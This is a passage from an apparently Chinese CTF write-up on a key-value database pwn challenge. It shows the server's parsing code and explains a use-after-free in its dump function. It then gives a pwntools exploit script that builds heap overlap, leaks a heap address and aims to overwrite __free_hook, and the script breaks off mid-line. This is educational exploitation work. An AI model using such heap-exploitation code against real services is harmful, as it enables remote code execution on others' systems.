class="keyword">data_t</span>* <span class="title">do_read_data_t</span><span class="params">(<span class="keyword">int</span> sock, <span class="keyword">int</span> level)</span> </span>&#123;</span><br><span class="line">    uint16 type_be;</span><br><span class="line">    uint16 type_le;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* new data_t obj */</span></span><br><span class="line">    <span class="keyword">data_t</span>* tmp = (<span class="keyword">data_t</span>*)<span class="built_in">calloc</span>(<span class="number">1</span>, <span class="keyword">sizeof</span>(<span class="keyword">data_t</span>));</span><br><span class="line">    <span class="keyword">if</span> (!tmp)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// integer</span></span><br><span class="line">    <span class="keyword">data_integer_t</span> integer_be = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// float</span></span><br><span class="line">    <span class="keyword">data_float_t</span> float_be = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// string</span></span><br><span class="line">    uint32 str_len_be = <span class="number">0</span>;</span><br><span class="line">    uint32 str_len_le = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// array</span></span><br><span class="line">    uint32 count_be = <span class="number">0</span>;</span><br><span class="line">    uint32 count_le = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">data_t</span>* item = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    readn(sock, (<span class="keyword">char</span>*)&amp;type_be, <span class="keyword">sizeof</span>(uint16));</span><br><span class="line">    type_le = BigLittleSwap16(type_be);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> l;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (type_le) &#123;</span><br><span class="line">        <span class="keyword">case</span> DATA_TYPE_INTEGER:</span><br><span class="line">            tmp-&gt;type = DATA_TYPE_INTEGER;</span><br><span class="line">            <span class="keyword">if</span> (readn(sock, (<span class="keyword">char</span>*)&amp;integer_be, <span class="keyword">sizeof</span>(<span class="keyword">data_integer_t</span>)) !=</span><br><span class="line">                <span class="keyword">sizeof</span>(<span class="keyword">data_integer_t</span>)) &#123;</span><br><span class="line">                <span class="keyword">goto</span> INVALID;</span><br><span class="line">            &#125;</span><br><span class="line">            tmp-&gt;integer = BigLittleSwap64(integer_be);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> DEBUG</span></span><br><span class="line">            <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;[%d] &quot;</span>, getpid());</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> l = <span class="number">0</span>; l &lt; level; l++) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;- &quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Integer: \x1B[36m0x%llx\x1B[0m\n&quot;</span>, tmp-&gt;integer);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">            <span class="keyword">return</span> tmp;</span><br><span class="line">        <span class="keyword">case</span> DATA_TYPE_FLOAT:</span><br><span class="line">            tmp-&gt;type = DATA_TYPE_FLOAT;</span><br><span class="line">            <span class="keyword">if</span> (readn(sock, (<span class="keyword">char</span>*)&amp;float_be, <span class="keyword">sizeof</span>(<span class="keyword">data_float_t</span>)) !=</span><br><span class="line">                <span class="keyword">sizeof</span>(<span class="keyword">data_float_t</span>)) &#123;</span><br><span class="line">                <span class="keyword">goto</span> INVALID;</span><br><span class="line">            &#125;</span><br><span class="line">            *(uint64*)&amp;tmp-&gt;_float = BigLittleSwap64(*(uint64*)&amp;float_be);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> DEBUG</span></span><br><span class="line">            <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;[%d] &quot;</span>, getpid());</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> l = <span class="number">0</span>; l &lt; level; l++) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;- &quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Float: \x1B[35m%lf\x1B[0m\n&quot;</span>, tmp-&gt;_float);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">            <span class="keyword">return</span> tmp;</span><br><span class="line">        <span class="keyword">case</span> DATA_TYPE_STRING:</span><br><span class="line">            tmp-&gt;type = DATA_TYPE_STRING;</span><br><span class="line">            <span class="keyword">if</span> (readn(sock, (<span class="keyword">char</span>*)&amp;str_len_be, <span class="keyword">sizeof</span>(uint32)) !=</span><br><span class="line">                <span class="keyword">sizeof</span>(uint32)) &#123;</span><br><span class="line">                <span class="keyword">goto</span> INVALID;</span><br><span class="line">            &#125;</span><br><span class="line">            str_len_le = BigLittleSwap32(str_len_be);</span><br><span class="line">            tmp-&gt;str.len = str_len_le;</span><br><span class="line">            tmp-&gt;str.ptr = (<span class="keyword">char</span>*)<span class="built_in">calloc</span>(str_len_le, <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">if</span> (!tmp-&gt;str.ptr)</span><br><span class="line">                <span class="keyword">goto</span> INVALID;</span><br><span class="line">            readn(sock, tmp-&gt;str.ptr, str_len_le);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> DEBUG</span></span><br><span class="line">            <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;[%d] &quot;</span>, getpid());</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> l = <span class="number">0</span>; l &lt; level; l++) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;- &quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;String(%d): \x1B[32m%s\x1B[0m\n&quot;</span>, tmp-&gt;str.len, tmp-&gt;str.ptr);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">            <span class="keyword">return</span> tmp;</span><br><span class="line">        <span class="keyword">case</span> DATA_TYPE_ARRAY:</span><br><span class="line">            tmp-&gt;type = DATA_TYPE_ARRAY;</span><br><span class="line">            <span class="keyword">if</span> (readn(sock, (<span class="keyword">char</span>*)&amp;count_be, <span class="keyword">sizeof</span>(uint32)) !=</span><br><span class="line">                <span class="keyword">sizeof</span>(uint32)) &#123;</span><br><span class="line">                <span class="keyword">goto</span> INVALID;</span><br><span class="line">            &#125;</span><br><span class="line">            count_le = BigLittleSwap32(count_be);</span><br><span class="line">            tmp-&gt;<span class="built_in">array</span>.count = count_le;</span><br><span class="line">            tmp-&gt;<span class="built_in">array</span>.items = (<span class="keyword">data_t</span>**)<span class="built_in">calloc</span>(count_le, <span class="keyword">sizeof</span>(<span class="keyword">data_t</span>*));</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> DEBUG</span></span><br><span class="line">            <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;[%d] &quot;</span>, getpid());</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> l = <span class="number">0</span>; l &lt; level; l++) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;- &quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\x1B[107mArray[%d]\x1B[0m:\n&quot;</span>, tmp-&gt;<span class="built_in">array</span>.count);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">            <span class="keyword">for</span> (uint32 i = <span class="number">0</span>; i &lt; count_le; i++) &#123;</span><br><span class="line">                item = <span class="keyword">do_read_data_t</span>(sock, level + <span class="number">1</span>);</span><br><span class="line">                <span class="keyword">if</span> (item == <span class="literal">NULL</span>) &#123;</span><br><span class="line">                    <span class="comment">/* release all received items when error occur */</span></span><br><span class="line">                    <span class="keyword">for</span> (uint32 j = <span class="number">0</span>; j &lt; i; j++) &#123;</span><br><span class="line">                        <span class="keyword">release_data_t</span>(tmp-&gt;<span class="built_in">array</span>.items[j]);</span><br><span class="line">                        <span class="built_in">free</span>(tmp-&gt;<span class="built_in">array</span>.items);</span><br><span class="line">                        <span class="keyword">goto</span> INVALID;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                tmp-&gt;<span class="built_in">array</span>.items[i] = item;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> tmp;</span><br><span class="line">        <span class="keyword">case</span> DATA_TYPE_EMPTY:</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> DEBUG</span></span><br><span class="line">            <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;[%d] &quot;</span>, getpid());</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> l = <span class="number">0</span>; l &lt; level; l++) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;- &quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Empty data_t\n&quot;</span>);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">            tmp-&gt;type = DATA_TYPE_EMPTY;</span><br><span class="line">            <span class="keyword">return</span> tmp;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">goto</span> INVALID;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">INVALID:</span><br><span class="line">    <span class="built_in">free</span>(tmp);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="0x3-漏洞"><a href="#0x3-漏洞" class="headerlink" title="0x3 漏洞"></a>0x3 漏洞</h3><p>漏洞就是出在dump函数中的<code>dump_data_item()</code>身上，他对数据库的复制并不是深拷贝，而是直接把地址拿过来了，最后还把这些地址全都通过<code>release_data_t()</code>函数释放了，但是这些地址还存在在数据库中，所以导致了<code>uaf</code>。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">data_t</span> *<span class="title">dump_data_item</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">data_t</span> *dump_array = (<span class="keyword">data_t</span> *)<span class="built_in">calloc</span>(<span class="number">1</span>, <span class="built_in"><span class="keyword">sizeof</span></span>(<span class="keyword">data_t</span>));</span><br><span class="line">    <span class="keyword">if</span>(!dump_array) <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    dump_array-&gt;type = DATA_TYPE_ARRAY;</span><br><span class="line">    dump_array-&gt;array.count = database.<span class="built_in">size</span>();</span><br><span class="line">    dump_array-&gt;array.items = (<span class="keyword">data_t</span> **)<span class="built_in">calloc</span>(dump_array-&gt;array.count, <span class="built_in"><span class="keyword">sizeof</span></span>(<span class="keyword">data_t</span> *));</span><br><span class="line">    std::list&lt;kvpair&gt;::iterator iter;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (iter = database.<span class="built_in">begin</span>(), i = <span class="number">0</span>; iter != database.<span class="built_in">end</span>(); iter++, i++) &#123;</span><br><span class="line">        <span class="comment">/* item_array[2] = &#123;key, value&#125; */</span></span><br><span class="line">        <span class="keyword">data_t</span> *item_array = (<span class="keyword">data_t</span> *)<span class="built_in">calloc</span>(<span class="number">1</span>, <span class="built_in"><span class="keyword">sizeof</span></span>(<span class="keyword">data_t</span>));</span><br><span class="line">        item_array-&gt;type = DATA_TYPE_ARRAY;</span><br><span class="line">        item_array-&gt;array.count = <span class="number">2</span>;</span><br><span class="line">        item_array-&gt;array.items = (<span class="keyword">data_t</span> **)<span class="built_in">calloc</span>(<span class="number">2</span>, <span class="built_in"><span class="keyword">sizeof</span></span>(<span class="keyword">data_t</span> *));</span><br><span class="line">        item_array-&gt;array.items[<span class="number">0</span>] = iter-&gt;first.<span class="built_in">get_data_t</span>();</span><br><span class="line">        item_array-&gt;array.items[<span class="number">1</span>] = iter-&gt;second.<span class="built_in">get_data_t</span>();</span><br><span class="line">        dump_array-&gt;array.items[i] = item_array;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dump_array;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="0x4-漏洞利用"><a href="#0x4-漏洞利用" class="headerlink" title="0x4 漏洞利用"></a>0x4 漏洞利用</h3><p>这个程序觉得最难的不是发现漏洞，而是发现漏洞后该如何利用漏洞，成功发现漏洞到利用成功又花了一天，由于key和value的前八个字节放的是他的类型，如果被free的话就会破坏，但是如果再次访问的话就访问不到了，刚开始的思路是让free掉的堆被unlink就好了，但是试了一会发现0x20大小的堆根本不会unlink,所以没办法free完之后立即使用</p>
<p>正确的思路就是直接再申请被free掉的堆块，这样就有两个指针指向同一块区域了，然后在申请的时候申请string的value,就可以利用string控制节点了。这是个概率事件，得多次重复的申请才可能成功。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#add_int_string</span></span><br><span class="line">payload=add_int_string(<span class="number">0x10</span>,<span class="number">0x40</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">payload+=add_int_string(<span class="number">0x20</span>,<span class="number">0x40</span>,<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">payload+=add_int_string(<span class="number">0x30</span>,<span class="number">0x40</span>,<span class="string">&#x27;c&#x27;</span>)</span><br><span class="line">payload+=add_int_string(<span class="number">0x40</span>,<span class="number">0x40</span>,<span class="string">&#x27;d&#x27;</span>)</span><br><span class="line">payload+=add_int_string(<span class="number">0x50</span>,<span class="number">0x40</span>,<span class="string">&#x27;e&#x27;</span>)</span><br><span class="line">payload+=add_int_string(<span class="number">0x60</span>,<span class="number">0x40</span>,<span class="string">&#x27;f&#x27;</span>)</span><br><span class="line"><span class="comment">#dump</span></span><br><span class="line">payload+=dump()</span><br><span class="line"><span class="comment">#add_string_string</span></span><br><span class="line">payload+=add_int_string(<span class="number">0x70</span>,<span class="number">0x16</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">payload+=add_int_string(<span class="number">0x80</span>,<span class="number">0x16</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0x16</span>)</span><br><span class="line">payload+=add_int_string(<span class="number">0x90</span>,<span class="number">0x16</span>,<span class="string">&#x27;c&#x27;</span>*<span class="number">0x16</span>)</span><br><span class="line">payload+=add_int_string(<span class="number">0xa0</span>,<span class="number">0x16</span>,<span class="string">&#x27;d&#x27;</span>*<span class="number">0x16</span>)</span><br><span class="line">payload+=add_int_string(<span class="number">0xb0</span>,<span class="number">0x16</span>,<span class="string">&#x27;e&#x27;</span>*<span class="number">0x16</span>)</span><br><span class="line">payload+=add_int_string(<span class="number">0xc0</span>,<span class="number">0x16</span>,<span class="string">&#x27;f&#x27;</span>*<span class="number">0x16</span>)</span><br></pre></td></tr></table></figure>

<p>这样以后堆块的堆叠情况是这样的</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">这是每一个键值对的堆块的后12位</span></span><br><span class="line">1:0a0 0c0</span><br><span class="line">2:310 330</span><br><span class="line">3:4c0 4e0</span><br><span class="line">4:5d0 5f0</span><br><span class="line">5:690 6b0</span><br><span class="line">6:750 770</span><br><span class="line"><span class="meta">#</span><span class="bash">再申请后</span></span><br><span class="line">0x70 string-&gt;0x80 value</span><br><span class="line">0xa0 string-&gt;310</span><br><span class="line">0xb0 string-&gt;0c0</span><br><span class="line">0xc0 value -&gt;0c0</span><br></pre></td></tr></table></figure>

<p>可见我们可以控制3个节点了，利用这三个节点完成对<code>__free_hook</code>的改写，然后反弹flag，出题人说不连外网，所以直接通过sokcet把flag反弹回来</p>
<p>完整脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">ip=<span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">port=<span class="number">9998</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#sh=remote(ip,port)</span></span><br><span class="line">sh=remote(<span class="string">&quot;pwn.archive.xdsec.chall.frankli.site&quot;</span>,<span class="number">10088</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line">op_buf=&#123;</span><br><span class="line">    <span class="number">1</span>:<span class="string">b&quot;ADD&quot;</span>,</span><br><span class="line">    <span class="number">2</span>:<span class="string">b&quot;DEL&quot;</span>,</span><br><span class="line">    <span class="number">3</span>:<span class="string">b&quot;MDF&quot;</span>,</span><br><span class="line">    <span class="number">4</span>:<span class="string">b&quot;RNM&quot;</span>,</span><br><span class="line">    <span class="number">5</span>:<span class="string">b&quot;CPY&quot;</span>,</span><br><span class="line">    <span class="number">6</span>:<span class="string">b&quot;GET&quot;</span>,</span><br><span class="line">    <span class="number">7</span>:<span class="string">b&quot;DUM&quot;</span>,</span><br><span class="line">    <span class="number">8</span>:<span class="string">b&quot;CLR&quot;</span>,</span><br><span class="line">    <span class="number">9</span>:<span class="string">b&quot;SHUT&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">build_int</span>(<span class="params">digit</span>):</span></span><br><span class="line">    pay=p16(<span class="number">0x0100</span>)+p64(digit)</span><br><span class="line">    <span class="keyword">return</span> pay</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">build_string</span>(<span class="params">str_len,str_srt</span>):</span></span><br><span class="line">    strlen=((str_len&amp;<span class="number">0xff000000</span>)&gt;&gt;<span class="number">24</span>)|((str_len&amp;<span class="number">0x00ff0000</span>)&gt;&gt;<span class="number">8</span>)|((str_len&amp;<span class="number">0x0000ff00</span>)&lt;&lt;<span class="number">8</span>)|((str_len&amp;<span class="number">0x000000ff</span>)&lt;&lt;<span class="number">24</span>)</span><br><span class="line">    pay=p16(<span class="number">0x0300</span>)+p32(strlen)</span><br><span class="line">    pay+=<span class="built_in">bytes</span>(str_srt.ljust(str_len,<span class="string">&#x27;\x00&#x27;</span>),<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> pay</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">build_string1</span>(<span class="params">str_len,str_srt</span>):</span></span><br><span class="line">    strlen=((str_len&amp;<span class="number">0xff000000</span>)&gt;&gt;<span class="number">24</span>)|((str_len&amp;<span class="number">0x00ff0000</span>)&gt;&gt;<span class="number">8</span>)|((str_len&amp;<span class="number">0x0000ff00</span>)&lt;&lt;<span class="number">8</span>)|((str_len&amp;<span class="number">0x000000ff</span>)&lt;&lt;<span class="number">24</span>)</span><br><span class="line">    pay=p16(<span class="number">0x0300</span>)+p32(strlen)</span><br><span class="line">    pay+=str_srt</span><br><span class="line">    <span class="keyword">return</span> pay</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">msg</span>(<span class="params">code,context</span>):</span></span><br><span class="line">    pay=<span class="string">b&#x27;KVDB&#x27;</span>+p16(<span class="number">0x0300</span>)+op_buf[code]</span><br><span class="line">    <span class="keyword">if</span>(context!=<span class="string">b&#x27;&#x27;</span>):</span><br><span class="line">        pay+=context</span><br><span class="line">    <span class="keyword">return</span> pay</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_int_string</span>(<span class="params">key_value,value_len,content</span>):</span></span><br><span class="line">    pay=build_int(key_value)</span><br><span class="line">    pay+=build_string(value_len,content)</span><br><span class="line">    <span class="keyword">return</span> msg(<span class="number">1</span>,pay)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dump</span>():</span></span><br><span class="line">    <span class="keyword">return</span> msg(<span class="number">7</span>,<span class="string">b&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">clear</span>():</span></span><br><span class="line">    <span class="keyword">return</span> msg(<span class="number">8</span>,<span class="string">b&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_string_string</span>(<span class="params">key_len,key_content,value_len,value_content</span>):</span></span><br><span class="line">    pay=build_string(key_len,key_content)</span><br><span class="line">    pay+=build_string(value_len,value_content)</span><br><span class="line">    <span class="keyword">return</span> msg(<span class="number">1</span>,pay)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">del_string_key</span>(<span class="params">key_len,key_content</span>):</span></span><br><span class="line">    pay=build_string(key_len,key_content)</span><br><span class="line">    <span class="keyword">return</span> msg(<span class="number">2</span>,pay)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">stringkey_get_value</span>(<span class="params">key_len,key_value</span>):</span></span><br><span class="line">    pay=build_string(key_len,key_value)</span><br><span class="line">    <span class="keyword">return</span> msg(<span class="number">6</span>,pay)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">intkey_get_value</span>(<span class="params">key_value</span>):</span></span><br><span class="line">    pay=build_int(key_value)</span><br><span class="line">    <span class="keyword">return</span> msg(<span class="number">6</span>,pay)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">del_int_key</span>(<span class="params">key_value</span>):</span></span><br><span class="line">    pay=build_int(key_value)</span><br><span class="line">    <span class="keyword">return</span> msg(<span class="number">2</span>,pay)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change_value</span>(<span class="params">key_value,value_len,value_content</span>):</span></span><br><span class="line">    pay=build_int(key_value)</span><br><span class="line">    pay+=build_string1(value_len,value_content)</span><br><span class="line">    <span class="keyword">return</span> msg(<span class="number">3</span>,pay)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change_key</span>(<span class="params">key_len,key_content,new_len,new_content</span>):</span></span><br><span class="line">    pay=build_string1(key_len,key_content)</span><br><span class="line">    pay+=build_string1(new_len,new_content)</span><br><span class="line">    <span class="keyword">return</span> msg(<span class="number">4</span>,pay)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    <span class="comment">#add_int_string</span></span><br><span class="line">    payload=add_int_string(<span class="number">0x10</span>,<span class="number">0x40</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    payload+=add_int_string(<span class="number">0x20</span>,<span class="number">0x40</span>,<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">    payload+=add_int_string(<span class="number">0x30</span>,<span class="number">0x40</span>,<span class="string">&#x27;c&#x27;</span>)</span><br><span class="line">    payload+=add_int_string(<span class="number">0x40</span>,<span class="number">0x40</span>,<span class="string">&#x27;d&#x27;</span>)</span><br><span class="line">    payload+=add_int_string(<span class="number">0x50</span>,<span class="number">0x40</span>,<span class="string">&#x27;e&#x27;</span>)</span><br><span class="line">    payload+=add_int_string(<span class="number">0x60</span>,<span class="number">0x40</span>,<span class="string">&#x27;f&#x27;</span>)</span><br><span class="line">    <span class="comment">#dump</span></span><br><span class="line">    payload+=dump()</span><br><span class="line">    <span class="comment">#add_string_string</span></span><br><span class="line">    payload+=add_int_string(<span class="number">0x70</span>,<span class="number">0x16</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    payload+=add_int_string(<span class="number">0x80</span>,<span class="number">0x16</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0x16</span>)</span><br><span class="line">    payload+=add_int_string(<span class="number">0x90</span>,<span class="number">0x16</span>,<span class="string">&#x27;c&#x27;</span>*<span class="number">0x16</span>)</span><br><span class="line">    payload+=add_int_string(<span class="number">0xa0</span>,<span class="number">0x16</span>,<span class="string">&#x27;d&#x27;</span>*<span class="number">0x16</span>)</span><br><span class="line">    payload+=add_int_string(<span class="number">0xb0</span>,<span class="number">0x16</span>,<span class="string">&#x27;e&#x27;</span>*<span class="number">0x16</span>)</span><br><span class="line">    payload+=add_int_string(<span class="number">0xc0</span>,<span class="number">0x16</span>,<span class="string">&#x27;f&#x27;</span>*<span class="number">0x16</span>)</span><br><span class="line">    <span class="comment">#del</span></span><br><span class="line">    payload+=del_int_key(<span class="number">0x80</span>)</span><br><span class="line">    <span class="comment">#get</span></span><br><span class="line">    payload+=intkey_get_value(<span class="number">0x70</span>)</span><br><span class="line">    sh.send(payload)</span><br><span class="line">    sleep(<span class="number">1</span>)</span><br><span class="line">    sh.recv(<span class="number">710</span>)</span><br><span class="line">    heap_base=u64(sh.recvuntil(<span class="string">&#x27;V&#x27;</span>)[-<span class="number">6</span>:]+<span class="string">b&#x27;\x00\x00&#x27;</span>)-<span class="number">0x128e0</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(heap_base))</span><br><span class="line">    <span class="comment">#add</span></span><br><span class="line">    payload=add_int_string(<span class="number">0xd0</span>,<span class="number">0x500</span>,<span class="string">&#x27;g&#x27;</span>)</span><br><span class="line">    <span class="comment">#change_value</span></span><br><span class="line">    heap_addr=heap_base+<span class="number">0x12a60</span></span><br><span class="line">    payload+=change_value(<span class="number">0xb0</span>,<span class="number">0x16</span>,p64(<span 